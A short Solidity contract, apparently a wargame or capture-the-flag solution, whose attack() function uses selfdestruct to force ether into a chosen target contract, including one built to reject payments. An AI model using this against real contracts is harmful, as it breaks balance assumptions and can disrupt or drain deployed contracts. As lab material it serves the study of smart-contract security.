// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    receive() external payable {}

    function attack() public payable {
        selfdestruct(payable(target));
    }
}
